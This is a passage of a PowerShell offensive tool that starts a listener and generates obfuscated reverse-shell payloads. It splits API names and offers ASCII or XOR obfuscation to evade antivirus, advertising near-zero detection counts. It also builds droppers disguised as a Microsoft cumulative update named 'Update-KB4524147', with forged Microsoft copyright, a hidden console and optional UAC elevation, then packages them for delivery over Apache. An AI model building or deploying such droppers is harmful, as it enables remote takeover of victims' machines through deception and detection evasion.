<#
.SYNOPSIS
  Starts a listener Server on a Windows|Linux and generates oneline reverse shell payloads

  Author: @ZHacker13 &('r00t-3xp10it')
  Required Dependencies: None
  Optional Dependencies: Python3 (windows)|Apache2 (Linux)
  PS Script Dev Version: v2.10.9
...
function Payload($IP,$Port,$Base64_Key){
  ...
  $rddse = "FromBa"+"se64String" -Join ''
  $opbypas = "`$1=[System.Byte[]]::Creat" + "eInstance([System.Byte],10" + "24);`$2=([Convert]::$rddse(`"@`"))" -Join ''
...
{
   Write-Host "`n`nDropper extension sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName      Detection"
   Write-Host "-- ---------------      ---------"
   Write-Host "1  Update-KB4524147.bat 0/54"
   Write-Host "2  Update-KB4524147.exe 2/54"
...
If($Choice -eq "1" -or $Choise -ieq "ASCII")
{
  Write-Host "`n[*] Obfuscation Type: ASCII";
  $fdsrsr = ASCII_Obfuscation($fdsrsr);
}

If($Choice -eq "2" -or $Choise -ieq "BXOR")
{
  Write-Host "`n[*] Obfuscation Type: BXOR";
  $fdsrsr = XOR_Obfuscation($fdsrsr);
}
...
If($check -ieq $False)
{
  ...
  If($Python_version)
  {
    ...
    .SYNOPSIS
       Author: r00t-3xp10it
       Helper - Use ps2exe cmdlet to convert dropper.ps1 to dropper.exe

    .NOTES
       -requireAdmin = UAC dialog appears if required
     ...
     #>
       ...
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/ps2exe.ps1" -OutFile "ps2exe.ps1"|Out-Null

       $RunElevated = Read-Host "[i] Make dropper prompt UAC dialog to run in elevated context? (yes|no)"
       If($RunElevated -iMatch '^(y|yes)$')
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Cumulative Update" -version "45.19041.964.0" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4524147" -noError -noConsole -requireAdmin|Out-Null
       }
       Else
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Cumulative Update" -version "45.19041.964.0" -copyright "©Microsoft Corporation. All Rights Reserved" -product "Update-KB4524147" -noError -noConsole|Out-Null
       }

       Start-Sleep -Seconds 2;Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force
       #Revert meterpeter EXE template to default state, after successfully created\compressed binary dropper (PE)
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Dropper_Bat"
       #Clean artifacts left behind by this function!
